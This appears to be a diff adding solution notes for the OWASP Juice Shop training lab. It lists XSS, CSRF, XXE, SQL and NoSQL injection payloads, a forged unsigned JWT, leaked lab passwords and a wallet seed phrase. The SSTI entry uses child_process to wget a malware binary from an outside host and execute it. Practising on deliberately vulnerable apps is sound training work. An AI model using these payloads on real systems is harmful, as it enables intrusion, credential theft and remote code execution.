@@ -1,0 +1,476 @@
+1. DOM XSS
+Let's start by searching for all products containing owasp in their name or description.
+
+What we will try now is a Cross-Site Scripting (XSS) attack, where we try to inject HTML or JavaScript code into the application
+
+Change your search value into <h1>owasp to see if we can inject HTML.
+
+Let's now try to inject JavaScript. Type <iframe src="javascript:alert(`xss`)"> into the search box now.
+
+Successfully performed an XSS attack!
+
+
+2. Bonus Payload
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+
+
+3. Bully Chatbot
+
+
+4. Confidential document
+
+
+5. Error Handling
+
+
+6. Expsoed Metrics
+
+
+7. Missing Encoding 
+assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg
+
+assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg
+
+
+8. Outdated Allowlist
+
+https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW
+
+
+9. Repetitive Registration
+
+
+10. Web3 Sandbox
+
+
+11. Zero Stars
+
+
+12. Reflected XSS
+
+
+13. Login Admin
+
+
+14. Admin section
+
+
+15. Password strength
+
+
+16. View Basket
+
+
+17. Deprecated Interface
+
+
+18. Empty User Registration
+
+
+19. Five-Star Feedback
+
+
+20. Login MC SafeSearchSD
+
+
+21. Meta Geo Stalking
+Daniel Boone National Forest
+
+
+22. NFT Takeover
+
+purpose betray marriage blame crunch monitor spin slide donate sport lift clutch
+
+0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e
+
+
+23. Security Policy
+
+
+24. Visual Geo Stalking
+
+ITsec
+
+
+25. Weird Crypto
+
+Analysing the webapage we could not find any algorithm or library.
+So, we can just randomly try some algorithms like MD5, SHA1, RSA, etc. and send them through the customer feedback page. Apparently, MD5 worked for solving this.
+
+
+26. Forged Feedback
+
+
+27. Login Jim
+
+
+28. Login Bender
+
+
+29. API-only XSS
+
+
+30. Admin Registration
+
+
+31. Bjoern's Favourite Pet
+
+
+32. CAPTCHA Bypass
+
+
+33. CSRF
+
+<form action="http://127.0.0.1:3000/profile" method="POST">
+  <input name="username" value="CSRF"/>
+  <input type="submit"/>
+</form>
+<script>document.forms[0].submit();</script>
+
+
+34. Client-side XSS Protection
+
+
+35. Database Schema
+
+
+36. Deluxe Fraud
+
+
+37. Forged Review
+
+
+38. GDPR Data Erasure
+
+
+39. Login Amy
+
+
+40. Manipulate Basket
+
+
+41. Mint the Honey Pot
+
+
+42. Payback Time
+
+
+43. Privacy Policy Inspection
+
+http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
+
+
+44. Product Tampering
+
+
+45. Reset Jim's Password
+
+
+46. Security Advisory
+
+
+47. Upload Size
+
+
+48. Upload Type
+
+
+49. XXE Data Access
+
+<?xml version="1.0"?>
+<!DOCTYPE xxe [
+<!ELEMENT xxe ANY >
+<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini" >]><xxe>&xxe;</xxe>
+
+
+50. Access Log
+
+Using tools like fuff(command for fuff "fuff -w /usr/share/wordlists/dirb/common.txt -u http://localhost:3000/support/FUZZ -fs 1925") we found the page to be http://localhost:3000/support/logs
+
+
+51. Allowlist Bypass
+
+
+52. CSP Bypass
+
+<<script>ascript>alert(`CSP Bypass`)</script>
+
+http://test.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'
+
+
+53. Chrismas Special
+
+
+54. Easter egg
+
+
+55. Ephemeral Accountant
+
+' UNION SELECT * FROM (SELECT 20 AS 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', 'test1234' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', 'default.svg' as 'profileImage', '' as 'topSecret', 1 as 'isActive', '2020-08-30 11:12:23.456 +00:00' as 'createdAt', '2020-08-30 11:12:13.456 +00:00' as 'updated', null as 'deletedAt')--
+
+
+56. Expired Coupon
+
+WMNSDY2019
+
+1551999600000
+
+
+57. Forgotten Developer Backup
+
+
+58. Forgotten Sales Backup
+
+
+59. GDPR Data Theft
+
+
+60. HTTP-Header XSS
+
+
+61. Leaked Unsafe Product
+
+
+62. Legacy Typosquatting
+
+
+63. Login Bjoern
+
+
+64. Misplaced Signature File
+
+
+65. Nested Easter Egg
+
+L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
+
+/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
+
+
+66. NoSQL DoS
+
+
+67. NoSQL Manipulation
+
+PATCH /rest/products/reviews
+
+"id":{
+"$ne":-1;
+}
+
+
+
+68. Poison Null Byte
+
+The same technique used on above challenges that uses %2500.md is called Null Byte.
+
+
+
+69. Reset Bender's Password
+
+Stop'n'Drop
+
+
+70. Reset Uvogin's Password
+
+Silence of the Lambs
+
+
+71. Server-side XSS Protection
+
+We can check Sanitize package version here it uses 1.4.2 and according to that we will use our modified payload that is <<iframe src="javascript:evil"/>iframe src="javascript:alert(`xss`)">
+
+
+72. Steganography
+
+http://localhost:3000/assets/public/images/carousel/5.png
+
+As there is only one image with png format downloading and checking it for steganography with tools like OpenStego we find the following
+
+Pickle Rick
+
+
+73. User Credentials
+
+Intercepting the request through burpsuite then sending it to repeater and adding “'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--” shows all the users
+
+
+74. Vulnerable Library
+
+marsdb ~0.6, grunt ~1.0, expressjwt 0.1.3,js-yaml 3.10, sequelize ~4, sanitize-html 1.4.2
+
+
+75. Blockchain Hype
+
+http://localhost:3000/assets/public/images/padding/56px.png
+
+
+76. Blocked RCE DoS
+
+(function dos() { while(true); })()
+
+
+77. Change Bender's Password
+
+bender@juice-sh.op
+
+slurmCl4ssic
+
+
+78. Cross-Site Imaging
+
+http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop
+
+79. Email Leak
+
+http://localhost:3000/rest/user/whoami?callback=anyone
+
+
+80. Extra Language
+
+GET /assets/i18n/tlh_AA.json HTTP/1.1
+
+
+81. Frontend Typosquatting 
+
+
+82. Kill Chatbot
+
+admin"); process=null; users.addUser("1337", "test
+
+
+83. Leaked Access Logs
+
+0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB
+
+0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB
+
+
+84. Local File Read
+
+
+85. NoSQL Exfiltration
+
+http://localhost:3000/rest/track-order/x
+
+http://localhost:3000/rest/track-order/' || true || '
+
+
+86. Reset Bjoern's Password
+
+bjoern@juice-sh.op
+
+West-2082
+
+
+87. Reset Morty's Password
+
+
+Creating a word list of all mutations (including typical "leet-speak"-variations!) of the strings 'snuffles' and 'snowball' using only lower case (a-z), upper case (A-Z) and digit characters (0-9)
+
+
+Snuffles-Snowball
+
+5N0wb41L
+
+
+88. Retrieve Blueprint
+
+http://localhost:3000/public/images/products/3d_keychain.jpg
+
+
+89. Supply Chain Attack
+
+https://github.com/eslint/eslint-scope/issues/39
+
+
+90. Two Factor Authentication
+
+http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,totpsecret,null,null,null,null from users--
+
+IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH
+
+
+91. Unsigned JWT
+
+{"typ":"JWT","alg":"none"}
+
+{
+  "status": "success",
+  "data": {
+    "id": 1,
+    "username": "admin\"); process=null; users.addUser(\"1337\", \"test,",
+    "email": "jwtn3d@juice-sh.op",
+    "password": "0192023a7bbd73250516f069df18b500",
+    "role": "admin",
+    "deluxeToken": "",
+    "lastLoginIp": "127.0.0.1",
+    "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2024-11-28 13:25:41.822 +00:00",
+    "updatedAt": "2024-11-28 19:44:31.045 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1732982795
+}
+
+
+92. XXE DoS 
+
+
+93. Arbitrary File Write
+
+Using the command "zip exploit.zip ../../ftp/legal.md" zipping the legal.md file completes the challenge
+
+
+94.  Forged Coupon
+
+z85 -e DEC24-80
+l}6D#g+yWv
+
+
+95. Forged Signed JWT
+
+
+96. Imaginary Challenge
+
+
+97. Login Support Team
+
+J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P
+
+
+98. Multiple Likes
+
+./racetheweb multiple-likes.toml
+
+
+
+99. Premium Paywall
+
+echo "IvLuRfBJYlmStf9XfL6ckJFngyd9LfV1JaaN/KRTPQPidTuJ7FR+D/nkWJUF+0xUF07CeCeqYfxq+OJVVa0gNbqgYkUNvn//UbE7e95C+6e+7GtdpqJ8mqm4WcPvUGIUxmGLTTAC2+G9UuFCD1DUjg==" | openssl enc -d -aes-256-cbc -K EA99A61D92D2955B1E9285B55BF2AD42 -iv 1337133713371337 -a -A
+
+this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us
+
+
+100. SSRF
+
+http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
+
+
+101. SSTi
+
+#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}
+
+
+102. Successful RCE DoS
+
+
+103. Video XSS
+
+</script><script>alert(`xss)</script>`
+zip exploit.zip ../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
+
+
+104. Wallet Depletion
